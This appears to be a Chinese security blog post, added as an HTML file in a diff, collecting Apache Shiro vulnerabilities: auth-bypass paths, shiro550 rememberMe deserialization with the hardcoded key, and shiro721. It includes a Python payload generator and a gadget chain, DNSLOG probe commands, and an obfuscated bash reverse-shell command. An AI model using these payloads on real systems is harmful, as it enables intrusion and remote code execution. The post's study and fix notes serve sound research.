@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="shiro简介Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。 认证绕过CVE-2020-11989 Poc： 1&#x2F;admin&#x2F;%20  影响范围：Apache Shiro &lt; 1.7.1 CVE-2020-1957 Poc： 1&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;  影响范围：Apache Shiro &lt; 1.5.3 CVE-2022-325">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/01/06/shiro%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="shiro简介Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。 认证绕过CVE-2020-11989 Poc： 1&#x2F;admin&#x2F;%20  影响范围：Apache Shiro &lt; 1.7.1 CVE-2020-1957 Poc： 1&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;  影响范围：Apache Shiro &lt; 1.5.3 CVE-2022-325">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732760025029-5139e8ee-7f54-43a8-aea1-3089832ed9ea.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732760048320-3a4c64b8-4392-48c8-b569-8563b6ea2a26.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732762140551-464ba438-e61a-4b13-864e-af0570b53b7e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732762441826-bd364d53-a782-4153-b75b-b9b8fb7b8450.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732763056232-26e1ad53-e9ee-4869-97c0-4594b0a7bcfa.png">
+<meta property="article:published_time" content="2025-01-06T15:36:07.759Z">
+<meta property="article:modified_time" content="2025-01-06T03:08:02.832Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732760025029-5139e8ee-7f54-43a8-aea1-3089832ed9ea.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-shiro漏洞合集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/06/shiro%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" class="article-date">
+  <time class="dt-published" datetime="2025-01-06T15:36:07.759Z" itemprop="datePublished">2025-01-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="shiro简介"><a href="#shiro简介" class="headerlink" title="shiro简介"></a>shiro简介</h1><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。</p>
+<h1 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h1><p>CVE-2020-11989</p>
+<p>Poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/%20</span><br></pre></td></tr></table></figure>
+
+<p>影响范围：Apache Shiro &lt; 1.7.1</p>
+<p>CVE-2020-1957</p>
+<p>Poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xxx/..;/admin/</span><br></pre></td></tr></table></figure>
+
+<p>影响范围：Apache Shiro &lt; 1.5.3</p>
+<p>CVE-2022-32532</p>
+<p>Poc： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/permit/any</span><br><span class="line">/permit/a%0any可绕过</span><br></pre></td></tr></table></figure>
+
+<p>需要依赖代码具体写法，无法自动化，风险较低。</p>
+<p>影响范围：Apache Shiro &lt; 1.9.1</p>
+<h1 id="shiro550-rememberMe反序列化漏洞"><a href="#shiro550-rememberMe反序列化漏洞" class="headerlink" title="shiro550 rememberMe反序列化漏洞"></a>shiro550 rememberMe反序列化漏洞</h1><p>Shiro rememberMe反序列化漏洞（CVE-2016-4437）</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro &lt;&#x3D; 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。</p>
+<p>该漏洞的根源在于硬编码Key。</p>
+<h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p>Apache Shiro &lt;&#x3D; 1.2.4</p>
+<p>环境搭建</p>
+<p>直接参考Vulhub：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/shiro/CVE-2016-4437/">https://vulhub.org/#/environments/shiro/CVE-2016-4437/</a></p>
+<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p>返回包中Set-Cookie头字段存在rememberMe&#x3D;deleteMe字段</p>
+<p>可以针对此类型接口进行PoC盲打</p>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h3 id="漏洞探测一"><a href="#漏洞探测一" class="headerlink" title="漏洞探测一"></a>漏洞探测一</h3><p>通用的反序列化探测类PoC为URLDNS这个Gadget，这是因为URLDNS类无需其他依赖、就存在于JDK环境中，其已集成在ysoserial中，我们直接用就可以了，使其指向DNSLOG</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-6eca5bc740-<span class="number">1.</span>jar URLDNS <span class="string">&quot;http://oup399.dnslog.cn&quot;</span> &gt; poc.ser</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\xxx\\poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.println(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行得到payload，放到Cookie的rememberMe中打过去</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732760025029-5139e8ee-7f54-43a8-aea1-3089832ed9ea.png"></p>
+<p>此时DNSLOG收到请求即可验证存在漏洞</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732760048320-3a4c64b8-4392-48c8-b569-8563b6ea2a26.png"></p>
+<h3 id="漏洞探测二"><a href="#漏洞探测二" class="headerlink" title="漏洞探测二"></a>漏洞探测二</h3><p>shiro_poc.py，基于ysoserial工具生成基于CommonsBeanutils1的反序列化利用payload，然后使用Shiro默认Key来进行AES和Base64相关加密操作，最后输出完整rememberMe的payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">from random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">from Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">def <span class="title function_">encode_rememberme</span><span class="params">(command)</span>:</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-master-6eca5bc740-1.jar&#x27;</span>, <span class="string">&#x27;CommonsBeanutils1&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.<span class="type">block_size</span></span><br><span class="line">    <span class="variable">pad</span> <span class="operator">=</span> lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.<span class="type">MODE_CBC</span></span><br><span class="line">    <span class="variable">iv</span>   <span class="operator">=</span>  uuid.uuid4().<span class="type">bytes</span></span><br><span class="line">    <span class="variable">encryptor</span> <span class="operator">=</span> AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.format(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>生成探测类的PoC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_poc.py <span class="string">&quot;ping xxx.ceye.io&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接将上述命令输出的payload放到Cookie中打过去，任意接口都OK。</p>
+<p>有漏洞就能查到dnslog记录。</p>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>shiro写了一个ObjectInputStream的子类，org.apache.shiro.io.ClassResolvingObjectInputStream，其重写了resolveClass方法。</p>
+<p>resolveClass是反序列化中用来查找类的方法，简单来说，读取序列化流的时候，读到一个字符串形</p>
+<p>式的类名，需要通过这个方法来找到对应的java.lang.Class对象。</p>
+<p>造成：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</p>
+<p>这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
+<h3 id="改造CommonsCollections6为CommonsCollectionsShiro"><a href="#改造CommonsCollections6为CommonsCollectionsShiro" class="headerlink" title="改造CommonsCollections6为CommonsCollectionsShiro"></a>改造CommonsCollections6为CommonsCollectionsShiro</h3><p>Payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">       <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">// obj作为tiedMapEntry的key就是巧妙之处</span></span><br><span class="line">       <span class="comment">// outerMap.get(obj) --&gt; lazyMap.get(obj) --&gt; invokerTransformer.transform(obj) --&gt; newTransformer().invoke(obj)</span></span><br><span class="line">       <span class="comment">// 之前需要数组是因为要保证newTransformer().invoke(xxx)这里的xxx是TemplatesImpl，所以用ConstantTransformer去固定它</span></span><br><span class="line">       <span class="comment">// 但是当obj作为lazy的key的时候，刚好可以被传进newTransformer().invoke(xxx)，ConstantTransformer了，也即不再需要数组了。</span></span><br><span class="line"></span><br><span class="line">       <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">       <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">       outerMap.clear();</span><br><span class="line">       setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>原来的cc6 Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* HashMap#readObject()</span><br><span class="line">   * HashMap#hash(key)</span><br><span class="line">   *      TiedMapEntry#hashCode()</span><br><span class="line">   *      TiedMapEntry#getValue()</span><br><span class="line">   *          LazyMap.get(key)</span><br><span class="line">   *              ChainedTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* HashMap#readObject()</span><br><span class="line">    * HashMap#hash(key)</span><br><span class="line">    *      TiedMapEntry#hashCode()</span><br><span class="line">    *      TiedMapEntry#getValue()</span><br><span class="line">    *          LazyMap.get(TemplatesImpl)</span><br><span class="line">    *              invokerTransformer.transform(TemplatesImpl)</span><br><span class="line">                       newTransformer().invoke(TemplatesImpl)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="无CC依赖的CB链"><a href="#无CC依赖的CB链" class="headerlink" title="无CC依赖的CB链"></a>无CC依赖的CB链</h3><p>shiro也可以用这个链来打，具体看对应笔记。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>还是用上面的shiro_poc.py，利用只需将执行的命令改为反弹shell的bash命令即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_poc.py <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMC4xLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>处理rememberMe的值：</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p>
+<p>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732762140551-464ba438-e61a-4b13-864e-af0570b53b7e.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732762441826-bd364d53-a782-4153-b75b-b9b8fb7b8450.png"></p>
+<p>这里AES加密算法是对称加密算法，即加密和解密的Key是一样的，而该Key则是硬编码写死在其中。</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>看到Apache Shiro 1.2.5版本的源码，修复方法就是将使用默认Key加密改为生成随机的Key加密：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732763056232-26e1ad53-e9ee-4869-97c0-4594b0a7bcfa.png"></p>
+<h1 id="shiro721"><a href="#shiro721" class="headerlink" title="shiro721"></a>shiro721</h1><p>在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt;&#x3D; 1.4.1</p>
+<h3 id="限制条件："><a href="#限制条件：" class="headerlink" title="限制条件："></a>限制条件：</h3><p>Apache Shiro Padding Oracle Attack的漏洞利用必须满足如下前提条件：</p>
+<ul>
+<li>开启rememberMe功能；</li>
+<li>rememberMe值使用AES-CBC模式解密；</li>
+<li>能获取到正常Cookie，即用户正常登录的Cookie值；</li>
+<li>密文可控；</li>
+</ul>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/06/shiro%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" data-id="cm5l7vlhu000bfscx7goqc5ff" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/01/06/XSream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/01/06/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/06/JNDI%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/%E5%8E%9F%E7%94%9FJDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
